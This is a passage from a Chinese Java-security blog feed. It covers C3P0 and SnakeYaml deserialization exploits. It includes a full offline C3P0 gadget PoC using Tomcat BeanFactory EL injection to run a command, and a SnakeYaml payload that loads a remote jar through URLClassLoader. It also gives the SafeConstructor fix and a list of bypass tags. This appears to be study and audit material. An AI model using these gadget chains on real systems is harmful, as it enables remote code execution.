ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;L:\\JavaSecurity\\ysoserial-0.0.6\\calc.ser&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">HexString</span> <span class="operator">=</span> bytesToHexString(data, data.length);</span><br><span class="line">        System.out.println(HexString);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到十六进制，直接去执行即可<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503342.png" alt="在这里插入图片描述"></p><h2 id="不出网利用"><a class="markdownIt-Anchor" href="#不出网利用">#</a> 不出网利用</h2><p>当目标机器不出网，且没有 fastjson 相关依赖时，C3P0 该如何利用？</p><p>环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">8.5</span><span class="number">.15</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>漏洞点位于 <code>org.apache.naming.factory.BeanFactory</code></p><p>只有一个方法 <code>getObjectInstance</code> <br> 回顾第一个链子 URL，会发现最后调用的就是该方法，而不出网的利用方式就是通过本地类的加载来进行 EL 表达式注入</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503699.png" alt="在这里插入图片描述"></p><p>将 URL 链子执行的地方改成 EL 表达式即可，其余不用变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Local</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> resourceRef;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(ConnectionPoolDataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        C3P01.<span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P01</span>.C3P0();</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(exp);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221504152.png" alt="在这里插入图片描述"></p><h2 id="最后"><a class="markdownIt-Anchor" href="#最后">#</a> 最后</h2><p>链子整体不是很难，但是有点绕，尤其是 JNDI 部分有的对象不 debug 一下很难想象是怎么联系起来的，本文也是应该很早就写完了，奈何最近阳了，也是隔离了一段时间休养了一段，希望能把后面的时间都利用起来吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SnakeYaml反序列化</title>
    <link href="https://ki10moc.github.io/2023/01/30/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://ki10moc.github.io/2023/01/30/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-01-30T03:35:36.000Z</published>
    <updated>2023-06-05T03:56:03.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="demo利用"><a class="markdownIt-Anchor" href="#demo利用">#</a> Demo 利用</h3><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>将源码简单修改下</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151636.png" alt="image-20230605115147426"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151170.png" alt="image-20230605115156615"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8000/yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(使用图片中自己 cv 的代码没有执行成功，卡了半天，干脆直接 down 了 github 的 poc 才执行成功的</p><p>原来还有个 SPI 机制</p><h3 id="spi机制"><a class="markdownIt-Anchor" href="#spi机制">#</a> SPI 机制</h3><p>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在 ClassPath 路径下的 META-INF/services 文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现</p><p>如果需要使用 SPI 机制需要在 Java classpath 下的  <code>META-INF/services/</code>  目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152172.png" alt="image-20230605115213134"></p><p>也就是说，我们在 META-INF/services 下创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类的全类名，在加载这个接口的时候就会实例化里面写上的类</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152405.png" alt="image-20230605115222968"></p><p>SPI 会通过 <code>java.util.ServiceLoder</code>  进行动态加载实现，在调用的时候，SPI 机制通过 <code>Class.forNam</code>  反射加载并且 <code>newInstance()</code>  反射创建对象的时候，静态代码块进行执行，从而达到命令执行的目的。</p><p>这里先插一句说下！！是什么</p><p>!! 就相当于 fastjson 里的 @type，用于指定要反序列化的全类名。</p><p>跟进到 loadFromReader 下 setComposer，指定反序列化全类名</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152765.png" alt="image-20230605115237095"></p><p>上一步 name 取到 javax.script.ScriptEngineManager，这里反射创建 javax.script.ScriptEngineManager 对象</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152528.png" alt="image-20230605115250020"></p><p>这里创建数组列表，调用 node.getType ().getDeclaredConstructors ()  遍历完的结果通过 possibleConstructors.add 再添加到<br> Class.forName 进行创建反射对象并且赋值给 note 的 type 里面。而后这里 getDeclaredConstructors () 获取它的无参构造方法。</p><p><img src="https://img-blog.csdnimg.cn/7b9527e27db64ac9b7cc5c779d9da017.png" alt="在这里插入图片描述"></p><p>再到这里返回实例对象</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153467.png" alt="image-20230605115300840"></p><p>construct 构造器加载进来</p><p>value 就是恶意类</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153960.png" alt="image-20230605115318765"><br> 再加载一轮</p><p>就拿到了<strong> javax.script.ScriptEngineManager 实例化对象</strong><br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153509.png" alt="image-20230605115339023"></p><p>反射调用将数组对象赋值给 c，最后再实例化</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153544.png" alt="image-20230605115354110"></p><p>这里再返回要加载地址<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154812.png" alt="image-20230605115407350"><br> 最后</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154770.png" alt="image-20230605115421143"></p><p>下面再来看下 SPI 机制的实现</p><p>断点下在 <code>ScriptEngineManager</code>  #75</p><p>ServiceLoader 动态加载类<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154277.png" alt="image-20230605115439050"></p><p>hasNexService 方法</p><p>加载 <code>META-INF/services/javax.script.ScriptEngineFactory</code>  获取实现类</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154158.png" alt="image-20230605115448854"></p><p>实例化</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154738.png" alt="image-20230605115458440"></p><p>走到后面就执行成功</p><h3 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h3><p>漏洞涉及到了全版本，只要反序列化内容可控，那么就可以去进行反序列化攻击</p><p>修复方案：加入 <code>new SafeConstructor()</code>  类进行过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload-master.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051155702.png" alt="image-20230605115508920"></p><p>再次执行会抛出异常</p><p>也可以拒绝不安全的反序列化操作，反序列化数据经过校验或者拒绝反序列化数据可控</p><p>在审计中其实就可以直接定位 <code>yaml.load();</code> ，然后进行回溯，如若参数可控，那么就可以尝试传入 payload。</p><p>一些绕过手法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREFIX</span> <span class="operator">=</span> <span class="string">&quot;tag:yaml.org,2002:&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">YAML</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:yaml&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">MERGE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:merge&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">SET</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:set&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">PAIRS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:pairs&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">OMAP</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:omap&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">BINARY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:binary&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">INT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:int&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">FLOAT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:float&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">TIMESTAMP</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:timestamp&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">BOOL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:bool&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">NULL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:null&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">STR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:str&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">SEQ</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:seq&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">MAP</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:map&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;demo利用&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#demo利用&quot;&gt;#&lt;/a&gt; Demo 利用&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https:</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-001</title>
    <link href="https://ki10moc.github.io/2023/01/28/Struts2-001/"/>
    <id>https://ki10moc.github.io/2023/01/28/Struts2-001/</id>
    <published>2023-01-28T12:22:36.000Z</published>
    <updated>2024-06-08T15:21:44.869Z</updated>
    
